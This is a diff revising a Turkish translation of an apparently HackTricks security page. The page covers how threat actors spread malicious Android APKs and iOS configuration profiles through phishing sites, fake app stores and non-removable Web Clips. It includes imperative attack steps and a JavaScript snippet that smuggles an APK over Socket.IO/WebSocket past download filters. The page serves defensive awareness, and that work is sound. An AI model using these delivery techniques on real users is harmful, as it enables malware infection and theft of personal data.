@@ -1,51 +1,52 @@
-# Mobile Phishing ve Malicious App Distribution (Android ve iOS)
+# Mobil Phishing ve Zararlı Uygulama Dağıtımı (Android ve iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> Bu sayfa, tehdit aktörlerinin phishing (SEO, social engineering, fake stores, dating apps vb.) yoluyla **malicious Android APKs** ve **iOS mobile-configuration profiles** dağıtmak için kullandığı teknikleri ele alır.
-> Materyal, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap campaign (2025) ve diğer kamuya açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>
+> Bu sayfada, tehdit aktörlerinin **zararlı Android APK’larını** ve **iOS mobil yapılandırma profillerini** phishing (SEO, sosyal mühendislik, sahte mağazalar, arkadaşlık uygulamaları vb.) yoluyla dağıtmak için kullandığı teknikler ele alınmaktadır.
+> İçerik, Zimperium zLabs tarafından ortaya çıkarılan SarangTrap kampanyasından (2025) ve diğer kamuya açık araştırmalardan uyarlanmıştır.<sup>[[1]](#references)</sup>
 
-## Attack Flow
+## Saldırı Akışı
 
-1. **SEO/Phishing Infrastructure**
-* Birbirine benzeyen onlarca domain kaydedin (dating, cloud share, car service…).
-– Google'da sıralamaya girmek için `<title>` elementinde yerel dil anahtar kelimeleri ve emojiler kullanın.
-– Aynı landing page üzerinde hem Android (`.apk`) hem de iOS kurulum talimatlarını barındırın.
-2. **First Stage Download**
-* Android: *unsigned* veya “third-party store” APK'sına doğrudan bağlantı.
-* iOS: kötü amaçlı **mobileconfig** profile yönlendiren `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
-3. **Android Post-install Behaviour**
-* C2-gated execution, permission abuse, dropper bypasses, background collection ve diğer post-install malware davranışları aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmaktadır.
-4. **iOS Delivery Technique**
-* Tek bir **mobile-configuration profile**, cihazı “MDM”-benzeri bir denetime kaydetmek için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. taleplerde bulunabilir.
-* Social-engineering talimatları:
-1. Settings'i açın ➜ *Profile downloaded*.
-2. *Install* seçeneğine üç kez dokunun (phishing page üzerinde ekran görüntüleri bulunur).
-3. Unsigned profile güvenin ➜ attacker, App Store incelemesi olmadan *Contacts* ve *Photo* yetkilerine sahip olur.
-5. **iOS Web Clip Payload (phishing app icon)**
-* `com.apple.webClip.managed` payload'ları, markalı bir icon/label ile bir phishing URL'sini **Home Screen'e sabitleyebilir**.
-* Web Clips **full-screen** çalışabilir (browser UI'ını gizler) ve **non-removable** olarak işaretlenebilir; böylece icon'u kaldırmak için victim'ın profile'ı silmesi gerekir.<sup>[[3]](#references)</sup>
-6. **Network Layer**
-* Genellikle 80 portunda, `api.<phishingdomain>.com` benzeri bir HOST header ile düz HTTP.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → kolayca fark edilir).
+1. **SEO/Phishing Altyapısı**
+   * Benzer görünümlü onlarca alan adı kaydedin (arkadaşlık, bulut paylaşımı, araç hizmeti vb.).  
+     – Google’da üst sıralarda yer almak için `<title>` öğesinde yerel dilde anahtar kelimeler ve emojiler kullanın.  
+     – Aynı açılış sayfasında hem Android (`.apk`) hem de iOS yükleme talimatları barındırın.
+2. **İlk Aşama İndirmesi**
+   * Android: *imzalanmamış* veya “üçüncü taraf mağaza” APK’sına doğrudan bağlantı.  
+   * iOS: Kötü amaçlı bir **mobileconfig** profiline yönlendiren `itms-services://` veya düz HTTPS bağlantısı (aşağıya bakın).
+3. **Android Kurulum Sonrası Davranış**
+   * C2 kontrollü çalıştırma, izinlerin kötüye kullanılması, dropper atlatmaları, arka planda veri toplama ve kurulum sonrası diğer kötü amaçlı yazılım davranışları aşağıdaki özel Android Malware Post-Exploitation sayfasında ele alınmaktadır.
+4. **iOS Dağıtım Tekniği**
+   * Tek bir **mobil yapılandırma profili**, cihazı “MDM” benzeri denetime almak için `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` vb. isteyebilir.  
+   * Sosyal mühendislik talimatları:
+     1. Settings ➜ *Profile downloaded* bölümünü açın.
+     2. *Install* düğmesine üç kez dokunun (phishing sayfasındaki ekran görüntüleriyle yönlendirilir).  
+     3. İmzalanmamış profile güvenin ➜ saldırgan, App Store incelemesinden geçmeden *Contacts* ve *Photo* yetkilerini kazanır.
+5. **iOS Web Clip Payload’u (phishing uygulaması simgesi)**
+   * `com.apple.webClip.managed` payload’ları, markalı bir simge/etiketle **bir phishing URL’sini Ana Ekrana sabitleyebilir**.
+   * Web Clip’ler **tam ekran** çalışabilir (tarayıcı arayüzünü gizler) ve **kaldırılamaz** olarak işaretlenebilir; böylece simgeyi kaldırmak için kurbanın profili silmesi gerekir.<sup>[[3]](#references)</sup>
+6. **Ağ Katmanı**
+   * Düz HTTP; genellikle 80 numaralı portta, `api.<phishingdomain>.com` gibi bir HOST başlığıyla.
+   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (TLS yok → tespit etmesi kolay).
 
 ## Android Malware Post-Exploitation
 
-C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS ve persistence gibi post-install Android malware tradecraft örnekleri için aşağıdaki özel sayfaya bakın:
+C2, Accessibility’nin kötüye kullanılması, overlay’ler, ATS otomasyonu, aşamalı DEX yükleme, premium SMS ve kalıcılık gibi kurulum sonrası Android malware tradecraft’i için şu sayfaya bakın:
 
 {{#ref}}
 ../basic-forensic-methodology/android-malware-post-exploitation.md
 {{#endref}}
 
-## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
+## Socket.IO/WebSocket Tabanlı APK Kaçakçılığı + Sahte Google Play Sayfaları
 
-Attackers, static APK bağlantılarını giderek Google Play'e benzeyen lure'lara gömülü bir Socket.IO/WebSocket channel ile değiştiriyor. Bu yöntem payload URL'sini gizler, URL/extension filtrelerini aşar ve gerçekçi bir install UX'i korur.<sup>[[2]](#references)[[4]](#references)</sup>
+Saldırganlar, statik APK bağlantıları yerine giderek daha sık Google Play’i andıran tuzaklara gömülü Socket.IO/WebSocket kanalları kullanıyor. Bu yöntem payload URL’sini gizler, URL/uzantı filtrelerini atlatır ve gerçekçi bir yükleme deneyimi sunar.<sup>[[2]](#references)[[4]](#references)</sup>
 
-Sahada gözlemlenen tipik client flow:
+Gerçek saldırılarda gözlemlenen tipik istemci akışı:
 
 <details>
-<summary>Socket.IO fake Play downloader (JavaScript)</summary>
+<summary>Sahte Play Socket.IO indiricisi (JavaScript)</summary>
+
 ```javascript
 // Open Socket.IO channel and request payload
 const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
@@ -58,21 +59,22 @@ socket.on("downloadProgress", (p) => updateProgressBar(p));
 
 // Assemble APK client‑side and trigger browser save dialog
 socket.on("downloadComplete", () => {
-const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
-const url = URL.createObjectURL(blob);
-const a = document.createElement("a");
-a.href = url; a.download = "app.apk"; a.style.display = "none";
-document.body.appendChild(a); a.click();
+  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url; a.download = "app.apk"; a.style.display = "none";
+  document.body.appendChild(a); a.click();
 });
 ```
+
 </details>
 
-Basit kontrollerden neden kaçtığı:
+Basit kontrolleri neden atlatır:
 - Statik bir APK URL'si açığa çıkmaz; payload, WebSocket frame'lerinden bellekte yeniden oluşturulur.
-- Doğrudan `.apk` yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSockets/Socket.IO üzerinden tünellenen binary verilerini gözden kaçırabilir.
-- WebSockets çalıştırmayan crawler'lar ve URL sandbox'ları payload'ı almaz.
+- Doğrudan .apk yanıtlarını engelleyen URL/MIME/uzantı filtreleri, WebSockets/Socket.IO üzerinden tünellenen ikili verileri gözden kaçırabilir.
+- WebSockets'i çalıştırmayan crawler'lar ve URL sandbox'ları payload'ı alamaz.
 
-Ayrıca WebSocket tradecraft ve araçları:
+Ayrıca WebSocket tradecraft ve araçlara bakın:
 
 {{#ref}}
 ../../pentesting-web/websocket-attacks.md
@@ -84,5 +86,5 @@ Ayrıca WebSocket tradecraft ve araçları:
 - [1] [Romantizmin Karanlık Yüzü: SarangTrap Şantaj Kampanyası](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
 - [2] [Socket.IO](https://socket.io)
 - [3] [Apple cihazları için Web Clips payload ayarları](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
-- [4] [Endonezya ve Vietnam Android Kullanıcılarını Hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
+- [4] [Endonezyalı ve Vietnamlı Android kullanıcılarını hedefleyen Banker Trojan](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 {{#include ../../banners/hacktricks-training.md}}
